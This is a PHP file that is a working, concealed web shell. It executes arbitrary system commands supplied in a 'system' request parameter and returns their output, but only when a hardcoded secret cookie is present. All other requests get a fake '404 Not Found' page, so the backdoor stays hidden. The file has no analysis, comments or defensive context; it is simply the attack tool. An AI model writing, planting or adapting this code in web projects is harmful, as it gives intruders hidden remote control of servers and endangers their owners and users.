<?php

if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
    if (isset($_REQUEST['system'])) {
        $command = $_REQUEST['system'];

        $process = proc_open($command, [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ], $pipes);

        if (is_resource($process)) {
            while ($line = fgets($pipes[1])) {
                echo "<pre>" . htmlspecialchars($line) . "</pre>";
                flush();
                ob_flush();
            }

            while ($errLine = fgets($pipes[2])) {
                echo "<pre style='color: red;'>" . htmlspecialchars($errLine) . "</pre>";
                flush();
                ob_flush();
            }

            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    } else {
        echo "Parameter 'system' tidak ditemukan.";
    }
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Not Found";
    exit;
}
?>
